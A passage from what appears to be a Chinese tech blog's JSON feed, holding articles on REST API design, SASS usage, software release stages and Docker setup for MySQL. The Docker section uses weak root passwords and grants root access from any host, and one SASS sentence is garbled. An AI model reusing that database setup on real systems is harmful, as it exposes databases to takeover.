<span>\"type\"</span><span>:</span> <span>\"application/vnd.yourformat+json\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>上面代码表示, 文档中有一个 link 属性, 用户读取这个属性就知道下一步该调用什么 API 了。rel 表示这个 API 与当前网址的关系（collection 关系, 并给出该 collection 的网址）, href 表示 API 的路径, title 表示 API 的标题, type 表示返回类型。</p>\n<p>Hypermedia API 的设计被称为 <a href=\"http://en.wikipedia.org/wiki/HATEOAS\" target=\"_blank\" rel=\"noopener noreferrer\">HATEOAS</a>。Github 的 API 就是这种设计, 访问 <a href=\"http://api.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">api.github.com</a> 会得到一个所有可用 API 的网址列表。</p>\n<div><pre><code><span>{</span>\n  <span>\"current_user_url\"</span><span>:</span> <span>\"https://api.github.com/user\"</span><span>,</span>\n  <span>\"authorizations_url\"</span><span>:</span> <span>\"https://api.github.com/authorizations\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p>从上面可以看到, 如果想获取当前用户的信息, 应该去访问 <a href=\"http://api.github.com/user\" target=\"_blank\" rel=\"noopener noreferrer\">api.github.com/user</a>, 然后就得到了下面结果。</p>\n<div><pre><code><span>{</span>\n  <span>\"message\"</span><span>:</span> <span>\"Requires authentication\"</span><span>,</span>\n  <span>\"documentation_url\"</span><span>:</span> <span>\"https://developer.github.com/v3\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p>上面代码表示, 服务器给出了提示信息, 以及文档的网址。</p>\n<h2 id=\"其他\" tabindex=\"-1\"> 其他</h2>\n<ul>\n<li>（1）API 的身份认证应该使用 <a href=\"http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html\" target=\"_blank\" rel=\"noopener noreferrer\">OAuth 2.0</a> 框架。</li>\n<li>（2）服务器返回的数据格式, 应该尽量使用 JSON, 避免使用 XML。</li>\n</ul>\n",
      "date_published": "2017-09-29T12:17:33.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "manual"
      ]
    },
    {
      "title": "SASS 用法指南",
      "url": "https://vxhly.github.io/views/manual/sass-usage-guide.html",
      "id": "https://vxhly.github.io/views/manual/sass-usage-guide.html",
      "summary": "前言\nSASS 是 CSS 预处理器之一, 它的基本思想是, 用一种专门的编程语言, 进行网页样式设计, 然后再编译成正常的 CSS 文件, 它提供了许多便利的写法, 大大节省了设计者的时间, 使得 CSS 的开发, 变得简单和可维护。\n\n",
      "content_html": "<div><p>前言</p>\n<p>SASS 是 CSS 预处理器之一, 它的基本思想是, 用一种专门的编程语言, 进行网页样式设计, 然后再编译成正常的 CSS 文件, 它提供了许多便利的写法, 大大节省了设计者的时间, 使得 CSS 的开发, 变得简单和可维护。</p>\n</div>\n\n<h2 id=\"环境布置\" tabindex=\"-1\"> 环境布置</h2>\n<h3 id=\"安装-ruby\" tabindex=\"-1\"> 安装 Ruby</h3>\n<p>SASS 是 Ruby 语言写的, 但是两者的语法没有关系。不懂 Ruby, 照样使用。只是必须先<a href=\"http://www.ruby-lang.org/zh_cn/downloads/\" target=\"_blank\" rel=\"noopener noreferrer\">安装 Ruby</a>, 然后再安装 SASS.</p>\n<p>在 Ubuntu 下安装 Ruby, <code>For Example:</code></p>\n<div><pre><code><span>sudo</span> <span>apt-get</span> <span>install</span> ruby\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>查看版本号, 确认 Ruby 环境安装完成</p>\n<div><pre><code>ruby -v\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"安装-sass\" tabindex=\"-1\"> 安装 SASS</h3>\n<p>Ruby 安装好了, 之后执行命令</p>\n<div><pre><code>gem <span>install</span> sass\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>查看版本号, 确认 SASS 环境安装完成</p>\n<div><pre><code>sass -v\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"使用\" tabindex=\"-1\"> 使用</h2>\n<h3 id=\"编译\" tabindex=\"-1\"> 编译</h3>\n<p>SASS 文件就是普通的文本文件, 里面可以直接使用 CSS 语法。文件后缀名是 <code>.scss</code> , 意思为 <code>Sassy CSS</code> 。</p>\n<p>下面的命令, 可以在屏幕上显示 <code>.scss</code> 文件转化的 <code>.css</code> 代码。（假设文件名为 <code>test</code> 。）</p>\n<div><pre><code>sass test.scss\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"编译风格\" tabindex=\"-1\"> 编译风格</h3>\n<p>如果要将显示结果保存成文件, 后面再跟一个 <code>.css</code> 文件名, <code>For Example:</code></p>\n<div><pre><code>sass test.scss test.css\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>SASS 提供四个[编译风格](http://sass-lang.com/docs/yardoc/file. SASS_REFERENCE.html#output_style)的选项</p>\n<ul>\n<li><strong>nested</strong> =&gt; 嵌套缩进的 css 代码, 它是默认值。</li>\n<li><strong>expanded</strong> =&gt; 没有缩进的、扩展的 css 代码。</li>\n<li><strong>compact</strong> =&gt; 简洁格式的 css 代码。</li>\n<li><strong>compressed</strong> =&gt; 压缩后的 css 代码。</li>\n</ul>\n<p>生产环境当中, 一般使用最后一个选项, <code>For Example:</code></p>\n<div><pre><code>sass --style compressed test.sass test.css\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>你也可以让 SASS 监听某个文件或目录, 一旦源文件有变动, 就自动生成编译后的版本</p>\n<div><pre><code>sass --watch input.scss:output.css            <span># watch a file</span>\nsass --watch app/sass:public/stylesheets      <span># watch a directory</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"基本用法\" tabindex=\"-1\"> 基本用法</h2>\n<h3 id=\"变量\" tabindex=\"-1\"> 变量</h3>\n<p>SASS 允许使用变量, 所有变量以 开头。 <code>For Example:</code></p>\n<div><pre><code><span><span>$blue</span></span><span>:</span> #1875e7<span>;</span>\n\n<span>div </span><span>{</span>\n  <span>color</span><span>:</span> <span>$blue</span><span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>如果变量需要镶嵌在字符串之中, 就必须需要写在 <code>#{}</code> 之中。 <code>For Example:</code></p>\n<div><pre><code><span><span>$side</span></span><span>:</span> left<span>;</span>\n\n<span>.rounded </span><span>{</span>\n  <span>border-<span>#{$side}</span>-radius</span><span>:</span> 5px<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"计算功能\" tabindex=\"-1\"> 计算功能</h3>\n<p>SASS 允许在代码中使用算式。 <code>For Example:</code></p>\n<div><pre><code><span>body </span><span>{</span>\n  <span>margin</span><span>:</span> <span>(</span>14px/2<span>)</span><span>;</span>\n  <span>top</span><span>:</span> 50px <span>+</span> 100px<span>;</span>\n  <span>right</span><span>:</span> <span>$var</span> <span>*</span> 10%<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"嵌套\" tabindex=\"-1\"> 嵌套</h3>\n<p>SASS 允许选择器嵌套。比如, 下面的 CSS 代码:</p>\n<div><pre><code><span>div h1 </span><span>{</span>\n  <span>color</span><span>:</span> red<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>可以写成:</p>\n<div><pre><code><span>div </span><span>{</span>\n  <span>h1 </span><span>{</span>\n    <span>color</span><span>:</span> red<span>;</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>属性也可以嵌套, 比如 <code>border-color</code> 属性, 可以写成:</p>\n<div><pre><code><span>p </span><span>{</span>\n  <span>border: </span><span>{</span>\n    <span>color</span><span>:</span> red<span>;</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><div><p>注意</p>\n<p><code>border</code> 后面必须加上冒号。</p>\n</div>\n<p>在嵌套的代码块内, 可以使用 <code>&amp;</code> 引用父元素。比如 <code>a:hover</code> 伪类, 可以写成:</p>\n<div><pre><code><span>a </span><span>{</span>\n  <span><span>&amp;</span>:hover </span><span>{</span>\n    <span>color</span><span>:</span> #ffb3ff<span>;</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"注释\" tabindex=\"-1\"> 注释</h3>\n<p>SASS 共有两种注释风格。</p>\n<p>标准的 CSS 注释 <code>/* comment */</code> , 会保留到编译后的文件。 单行注释 <code>// comment</code> , 只保留在 SASS 源文件中, 编译后被省略。</p>\n<p>在 <code>/*</code> 后面加一个感叹号, 表示这是&quot;重要注释&quot;。即使是压缩模式编译, 也会保留这行注释, 通常可以用于声明版权信息。</p>\n<div><pre><code><span>/*!\n * 重要注释！\n */</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"代码的重用\" tabindex=\"-1\"> 代码的重用</h2>\n<h3 id=\"继承\" tabindex=\"-1\"> 继承</h3>\n<p>SASS 允许一个选择器, 继承另一个选择器。比如, 现有 <code>class1</code> :</p>\n<div><pre><code><span>.class1 </span><span>{</span>\n  <span>border</span><span>:</span> 1px solid #ddd<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><code>class2</code> 要继承 <code>class1</code> , 就要使用 <code>@extend</code> 命令:</p>\n<div><pre><code><span>.class2 </span><span>{</span>\n  <span>@extend</span> .class1<span>;</span>\n  <span>font-size</span><span>:</span> 120%<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h3 id=\"mixin\" tabindex=\"-1\"> Mixin</h3>\n<p>Mixin 有点像 C 语言的宏（ <code>macro</code> ）, 是可以重用的代码块。 使用 <code>@mixin</code> 命令, 定义一个代码块。</p>\n<div><pre><code><span>@mixin</span> <span>left </span><span>{</span>\n  <span>float</span><span>:</span> left<span>;</span>\n  <span>margin-left</span><span>:</span> 10px<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p>使用 <code>@include</code> 命令, 调用这个 <code>mixin</code> 。</p>\n<div><pre><code><span>div </span><span>{</span>\n  <span>@include</span> left<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><code>mixin</code> 的强大之处, 在于可以指定参数和缺省值。</p>\n<div><pre><code><span>@mixin</span> <span>left</span><span>(</span><span><span>$value</span></span><span>:</span> 10px<span>)</span> <span>{</span>\n  <span>float</span><span>:</span> left<span>;</span>\n  <span>margin-right</span><span>:</span> <span>$value</span><span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p>使用的时候, 根据需要加入参数:</p>\n<div><pre><code><span>div </span><span>{</span>\n  <span>@include</span> <span>left</span><span>(</span>20px<span>)</span><span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>下面是一个 <code>mixin</code> 的实例, 用来生成浏览器前缀。</p>\n<div><pre><code><span>@mixin</span> <span>rounded</span><span>(</span><span>$vert</span><span>,</span> <span>$horz</span><span>,</span> <span><span>$radius</span></span><span>:</span> 10px<span>)</span> <span>{</span>\n  <span>border-<span>#{$vert}</span>-<span>#{$horz}</span>-radius</span><span>:</span> <span>$radius</span><span>;</span>\n  <span>-moz-border-radius-<span>#{$vert}</span><span>#{$horz}</span></span><span>:</span> <span>$radius</span><span>;</span>\n  <span>-webkit-border-<span>#{$vert}</span>-<span>#{$horz}</span>-radius</span><span>:</span> <span>$radius</span><span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>使用的时候, 可以像下面这样调用:</p>\n<div><pre><code><span>#navbar li </span><span>{</span>\n  <span>@include</span> <span>rounded</span><span>(</span>top<span>,</span> left<span>)</span><span>;</span>\n<span>}</span>\n\n<span>#footer </span><span>{</span>\n  <span>@include</span> <span>rounded</span><span>(</span>top<span>,</span> left<span>,</span> 5px<span>)</span><span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"颜色函数\" tabindex=\"-1\"> 颜色函数</h3>\n<p>SASS 提供了一些内置的颜色函数, 以便生成系列颜色。</p>\n<div><pre><code><span>lighten</span><span>(</span>#cc3<span>,</span> 10%<span>)</span> <span>// #d6d65c</span>\n<span>darken</span><span>(</span>#cc3<span>,</span> 10%<span>)</span> <span>// #a3a329</span>\n<span>grayscale</span><span>(</span>#cc3<span>)</span> <span>// #808080</span>\n<span>complement</span><span>(</span>#cc3<span>)</span> <span>// #33c</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h3 id=\"插入文件\" tabindex=\"-1\"> 插入文件</h3>\n<p><code>@import</code> 命令, 用来插入外部文件。</p>\n<div><pre><code><span>@import</span> <span>\"path/filename.scss\"</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>如果插入的是 <code>.css</code> 文件, 则等同于 css 的 <code>import</code> 命令。</p>\n<div><pre><code><span>@import</span> <span>\"foo.css\"</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"高级用法\" tabindex=\"-1\"> 高级用法</h2>\n<h2 id=\"条件语句\" tabindex=\"-1\"> 条件语句</h2>\n<p><code>@if</code> 可以用来判断:</p>\n<div><pre><code><span>p </span><span>{</span>\n  <span>@if</span> <span>1+1==2 </span><span>{</span>\n    <span>border</span><span>:</span> 1px solid<span>;</span>\n  <span>}</span>\n\n  <span>@if</span> <span>5 &lt; 3 </span><span>{</span>\n    <span>border</span><span>:</span> 2px dotted<span>;</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>配套的还有 <code>@else</code> 命令:</p>\n<div><pre><code><span>@if</span> <span>lightness</span><span>(</span><span>$color</span><span>)</span> <span>>30% </span><span>{</span>\n  <span>background-color</span><span>:</span> #000<span>;</span>\n<span>}</span> <span>@else</span> <span>{</span>\n  <span>background-color</span><span>:</span> #fff<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"循环语句\" tabindex=\"-1\"> 循环语句</h3>\n<p>SASS 支持 <code>for</code> 循环:</p>\n<div><pre><code><span>@for</span> <span>$i</span> <span>from</span> <span>1 to 10 </span><span>{</span>\n  <span>.border-<span>#{$i}</span> </span><span>{</span>\n    <span>border</span><span>:</span> <span>#{$i}</span>px solid blue<span>;</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>也支持 <code>while</code> 循环:</p>\n<div><pre><code><span><span>$i</span></span><span>:</span> 6<span>;</span>\n\n<span>@while</span> <span><span>$i</span>>0 </span><span>{</span>\n  <span>.item-<span>#{$i}</span> </span><span>{</span>\n    <span>width</span><span>:</span> 2em <span>*</span> <span>$i</span><span>;</span>\n  <span>}</span>\n\n  <span><span>$i</span></span><span>:</span> <span>$i</span> <span>-</span> 2<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>each</code> 命令, 作用与 <code>for</code> 类似:</p>\n<div><pre><code><span>@each</span> <span><span>$member</span> in a, b, c, d </span><span>{</span>\n  <span>.<span>#{$member}</span> </span><span>{</span>\n    <span>background-image</span><span>:</span> <span>url</span><span>(</span><span>\"/image/#{$member}.jpg\"</span><span>)</span><span>;</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"自定义函数\" tabindex=\"-1\"> 自定义函数</h3>\n<p>SASS 允许用户编写自市场上市己的函数。</p>\n<div><pre><code><span>@function</span> <span>double</span><span>(</span><span>$n</span><span>)</span> <span>{</span>\n  <span>@return</span> <span>$n</span> <span>*</span> 2<span>;</span>\n<span>}</span>\n\n<span>#sidebar </span><span>{</span>\n  <span>width</span><span>:</span> <span>double</span><span>(</span>5px<span>)</span><span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>",
      "date_published": "2016-10-11T18:57:49.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "manual"
      ]
    },
    {
      "title": "软件版本周期",
      "url": "https://vxhly.github.io/views/manual/software-version-cycle.html",
      "id": "https://vxhly.github.io/views/manual/software-version-cycle.html",
      "summary": "前言\n软件版本周期是指计算机软件的发展及发行过程, 从 Pre-alpha（准预览版本）发展到 Alpha（预览版本）、Beta（测试版本）、Released candidate （最终测试版本）至最后的 Gold（完成版）。\n\n",
      "content_html": "<div><p>前言</p>\n<p>软件版本周期是指计算机软件的发展及发行过程, 从 Pre-alpha（准预览版本）发展到 Alpha（预览版本）、Beta（测试版本）、Released candidate （最终测试版本）至最后的 Gold（完成版）。</p>\n</div>\n\n<h2 id=\"一张图诠释发展软件的过程\" tabindex=\"-1\"> 一张图诠释发展软件的过程</h2>\n<p><img src=\"/assets/software.jpg\" alt=\"software-version\"></p>\n<h2 id=\"开发期\" tabindex=\"-1\"> 开发期</h2>\n<h3 id=\"pre-alpha\" tabindex=\"-1\"> Pre-alpha</h3>\n<p>有时候软件会在 Alpha 或 Beta 版本前先发布 Pre-alpha 版本。一般而言相对于 Alpha 或 Beta 版本, Pre-alpha 版本是一个功能不完整的版本</p>\n<h3 id=\"alpha\" tabindex=\"-1\"> Alpha</h3>\n<p>Alpha 版本仍然需要测试, 其功能亦未完善, 因为它是整个软件发布周期中的第一个阶段, 所以它的名称是&quot;Alpha&quot;, 希腊字母中的第一个字母&quot;α&quot;。</p>\n<p>Alpha 版本通常会送到开发软件的组织或某群体中的软件测试者作内部测试。在市场上, 越来越多公司会邀请外部客户或合作伙伴参与其测试。这令软件在此阶段有更大的可用性测试。</p>\n<p>在测试的第一个阶段中, 开发者通常会进行白盒测试。其他测试会在稍后时间由其他测试团体以黑盒或灰盒技术进行, 不过有时会同时进行。</p>\n<h3 id=\"beta\" tabindex=\"-1\"> Beta</h3>\n<p>Beta 版本是软件最早对外公开的软件版本, 由公众（通常为公司外的第三方开发者和业余玩家）参与测试。 因为是 Alpha 的下一个阶段, 所以为希腊字母的第二个字 Beta (β)。 一般来说, Beta 包含所有功能, 但可能有一些已知问题和较轻微的程序错误（BUG）, 要进行除错（debug）。Beta 版本的测试者通常是开发软件的组织的客户, 他们会以免费或优惠价钱得到软件。Beta 版本亦作为测试产品的支持和市场反应等。</p>\n<p>其他情况不同企业有不同的称法, 例如微软曾以 Community Technology Preview（简称 CTP, 中文称为&quot;社群技术预览&quot;）为发布软件的测试版本之一, 微软将这个阶段的软件散布给有需要先行试用的用户或厂商, 并收集这些人的使用经验, 以便作为进一步修正软件的参考。</p>\n<h3 id=\"release-candidate\" tabindex=\"-1\"> Release Candidate</h3>\n<p>Release Candidate（简称 RC）指可能成为最终产品的候选版本, 如果未出现问题则可发布成为正式版本。在此阶段的产品通常包含所有功能、或接近完整, 亦不会出现严重问题。</p>\n<p>多数开源软件会推出两个 RC 版本, 最后的 RC2 则成为正式版本。闭源软件较少公开使用, 微软公司在 Windows 7 上应用此名称。苹果公司把在这阶段的产品称为&quot;Golden Master Candidate&quot;（简称 GM Candidate）, 而最后的 GM 即成为正式版本。</p>\n<h2 id=\"完成期\" tabindex=\"-1\"> 完成期</h2>\n<h3 id=\"release-to-manufacting-rtm\" tabindex=\"-1\"> Release to Manufacting, RTM</h3>\n<p><code>生产商发放</code> （Release to Manufacturing, 缩写 <code>RTM</code> ）是软件产品准备交付时使用的术语, 来自于以前还需要使用实体载具（光盘, 硬盘等）来进行安装的时代。某些计算机程序以&quot;RTM&quot;作为软件版本代号, 例如微软 Windows 7 发行零售版前的 RTM 版本主要是发放给组装机生产商用, 使制造商能够提早进行集成工作或解决软件与硬件设备可能遇到的错误。RTM 版本并不一定意味着创作者解决了软件所有问题；仍有可能向公众发布前更新版本。以 Windows 7 为例: RTM 版与零售版的版本号是一样的。</p>\n<h3 id=\"general-availability-ga\" tabindex=\"-1\"> General availability, GA</h3>\n<p><code>一般可用</code> （General availability, 缩写 <code>GA</code> ）是所有必要的商业活动已经完成, 该软件产品已经可以发售的阶段。然而, 这取决于语言、地域和电子设备与媒体的可用性, 有些地区之间可能会有上市时间的延迟。商业活动可能也包括安全性和合法测试, 以及本地化和全球销售的可能性评估。RTM 与 GA 的间隔可能会是 1 周或几个月, 因为在此过程中需要进行许多商业活动。在这个阶段, 可以说软件已经&quot;上线&quot;了。</p>\n<h3 id=\"release-to-web-rtw\" tabindex=\"-1\"> Release to Web, RTW</h3>\n<p><code>网络分发</code> （Release to Web, 缩写 <code>RTW</code> ）, 或称 Web 发布是一种利用互联网进行分发的软件交付方式。制造商在这种类型的发布中并不生产实体软件工具, 而会借由 OTA 来进行发放。随着互联网使用人数的增长, RTW 变得越来越普遍。</p>\n<h3 id=\"stable\" tabindex=\"-1\"> Stable</h3>\n<p><code>稳定版本</code> 来自预览版本释出使用与改善而修正完成, 通常是初始版本进行几个小更新后的版本。为目前所使用的软件在匹配需求规格的硬件与操作系统中运行不会造成严重的不兼容或是硬件冲突, 其已受过某定量的测试无误后所释出者。</p>\n",
      "image": "https://vxhly.github.io/assets/software.jpg",
      "date_published": "2018-10-21T19:13:55.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "manual"
      ]
    },
    {
      "title": "docker 使用指南",
      "url": "https://vxhly.github.io/views/manual/usage-of-docker.html",
      "id": "https://vxhly.github.io/views/manual/usage-of-docker.html",
      "summary": "前言\nDocker 是一个开源的应用容器引擎, 基于 Go 语言 并遵从 Apache2.0 协议开源。 Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中, 然后发布到任何流行的 Linux 机器上, 也可以实现虚拟化。\n\n",
      "content_html": "<div><p>前言</p>\n<p>Docker 是一个开源的应用容器引擎, 基于 Go 语言 并遵从 Apache2.0 协议开源。 Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中, 然后发布到任何流行的 Linux 机器上, 也可以实现虚拟化。</p>\n</div>\n\n<h2 id=\"为什么要用-docker\" tabindex=\"-1\"> 为什么要用 Docker？</h2>\n<p>在没有 docker 之前, 如果我们要在 windows 上安装 mysql、mongodb 需要先下载这些软件, 然后还要一步步点设置, 并且注册到 windows 服务。并且根本不知道安装到什么地方（某些版本 mysql 不能指定安装位置, 默认到 C 盘）。同时也会在控制面板内注册许多相关的插件。以后要卸载的时候可能还会有各种残留。作为一个强迫症患者这是万万不能忍受的。 现在有了 docker, 只需要一行代码就能拉取所需软件的镜像, 然后配置一个容器就启动了。需要开发的时候就打开 docker, 服务便能够运行。占用的空间也小, 性能和原生差异不大。增删查改都只需要一行代码就能完成。卸载起来也毫无残留。更重要的是, 我可以同时有一个镜像的几个容器。即使我搞坏了一个, 也可以用其他的容器。还能随时监测这些容器的磁盘占用等状态</p>\n<h2 id=\"docker-文档\" tabindex=\"-1\"> docker 文档</h2>\n<div><p>提示</p>\n<p>这里只找到了英文的文档, 所以英文不好的慎阅 <a href=\"https://docs.docker.com\" target=\"_blank\" rel=\"noopener noreferrer\">官方 docker 文档</a> <a href=\"https://docker_practice.gitee.io/\" target=\"_blank\" rel=\"noopener noreferrer\">非官方 docker 整理文档</a></p>\n</div>\n<h2 id=\"常用的-docker-命令\" tabindex=\"-1\"> 常用的 docker 命令</h2>\n<div><pre><code><span>docker</span> pull <span>[</span>image_name<span>]</span>:<span>[</span>version<span>]</span>  <span># 下载镜像</span>\n<span>docker</span> run -it <span>[</span>docker_id<span>]</span> <span>bash</span>     <span># 运行一个容器实例</span>\n\n<span>docker</span> <span>ps</span>             <span># 查看当前运行的 docker 容器的进程信息</span>\n<span>docker-compose</span> <span>ps</span>     <span># 查看当前的使用 docker-compose up -d 开启的容器进程信息</span>\n<span>docker-compose</span> up -d  <span># 使用本地的 docker-compose.yml 开启相关的容器</span>\n<span>docker-compose</span> down   <span># 终止当前的使用 docker-compose up -d 开启的容器</span>\n<span>docker</span> images         <span># 查看本地的所有 docker 镜像</span>\n<span>docker</span> image <span>rm</span> <span>[</span>docker_image_id<span>]</span>   <span># 删除本地的 docker 镜像</span>\n<span>docker</span> rmi -f <span>[</span>docker_image_id<span>]</span>     <span># 删除本地的 docker 镜像</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"在你的机子上安装服务\" tabindex=\"-1\"> 在你的机子上安装服务</h2>\n<p>至于一些 docker 镜像下载加速或者其他的知识自行查阅文档, 这里只收集 docker 安装各种服务的方法</p>\n<h3 id=\"ubuntu\" tabindex=\"-1\"> Ubuntu</h3>\n<div><pre><code>$ <span>docker</span> pull ubuntu\n$ <span>docker</span> run -it ubuntu <span>bash</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"mysql\" tabindex=\"-1\"> MySQL</h3>\n<h4 id=\"通过镜像\" tabindex=\"-1\"> 通过镜像</h4>\n<div><pre><code><span># 搜索mysql的镜像信息</span>\n$ <span>docker</span> search mysql\n<span># 从仓库拉取mysql,mysql:tag 后面可以跟标签得到指定版本,不加默认为lastest</span>\n$ <span>docker</span> pull mysql\n\n$ <span>docker</span> run --name test-mysql -p <span>3306</span>:3306 -e <span>MYSQL_ROOT_PASSWORD</span><span>=</span>root -d mysql:5.6\n$ <span>docker</span> run --name test-phpmyadmin -p <span>8080</span>:80 --link test-mysql:db -d phpmyadmin/phpmyadmin:latest\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"通过-docker-compose-yml\" tabindex=\"-1\"> 通过 docker-compose.yml</h4>\n<div><pre><code><span>version</span><span>:</span> <span>\"2\"</span>\n<span>services</span><span>:</span>\n  <span>mysql</span><span>:</span>\n    <span>image</span><span>:</span> mysql<span>:</span><span>5.6</span>\n    <span>container_name</span><span>:</span> test<span>-</span>mysql\n    <span>restart</span><span>:</span> always\n    <span>ports</span><span>:</span>\n      <span>-</span> <span>\"3306:3306\"</span>\n\n    <span>environment</span><span>:</span>\n      <span>MYSQL_USER</span><span>:</span> <span>\"root\"</span>\n      <span>MYSQL_PASSWORD</span><span>:</span> <span>\"root\"</span>\n      <span>MYSQL_ROOT_PASSWORD</span><span>:</span> <span>\"root\"</span>\n    <span>networks</span><span>:</span>\n      <span>-</span> net<span>-</span>mysql\n\n  <span>phpmyadmin</span><span>:</span>\n    <span>image</span><span>:</span> phpmyadmin/phpmyadmin<span>:</span>latest\n    <span>container_name</span><span>:</span> test<span>-</span>phpmyadmin\n    <span>ports</span><span>:</span>\n      <span>-</span> <span>\"8080:80\"</span>\n\n    <span>environment</span><span>:</span>\n      <span>MYSQL_USER</span><span>:</span> <span>\"root\"</span>\n      <span>MYSQL_PASSWORD</span><span>:</span> <span>\"root\"</span>\n      <span>MYSQL_ROOT_PASSWORD</span><span>:</span> <span>\"root\"</span>\n      <span>PMA_HOST</span><span>:</span> test<span>-</span>mysql\n    <span>networks</span><span>:</span>\n      <span>-</span> net<span>-</span>mysql\n\n<span>networks</span><span>:</span>\n  <span>net-mysql</span><span>:</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>docker-compose.yml 同级目录下执行: <code>docker-compose up -d</code> 之后在浏览器访问 <code>http://127.0.0.1:7777</code> 即可</p>\n<p>如果无法正常登录的话, 使用 <code>docker exec -it [dockerId] bash</code> 进入 MySQL 容器并登陆 MySQL 执行以下命令</p>\n<div><pre><code>mysql<span>></span> grant all privileges on *.*  to <span>'root'</span>@<span>'%'</span><span>;</span>\nmysql<span>></span> flush privileges<span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><div><pre><code><span># Use root/p@ssw0rd as user/password credentials</span>\n<span>version</span><span>:</span> <span>\"3.1\"</span>\n\n<span>services</span><span>:</span>\n  <span>db</span><span>:</span>\n    <span>image</span><span>:</span> mysql\n    <span>command</span><span>:</span> <span>-</span><span>-</span>default<span>-</span>authentication<span>-</span>plugin=mysql_native_password\n    <span>restart</span><span>:</span> always\n    <span>environment</span><span>:</span>\n      <span>MYSQL_ROOT_PASSWORD</span><span>:</span> p@ssw0rd\n\n  <span>adminer</span><span>:</span>\n    <span>image</span><span>:</span> adminer\n    <span>restart</span><span>:</span> always\n    <span>ports</span><span>:</span>\n      <span>-</span> 8080<span>:</span><span>8080</span>\n</code></pre><div 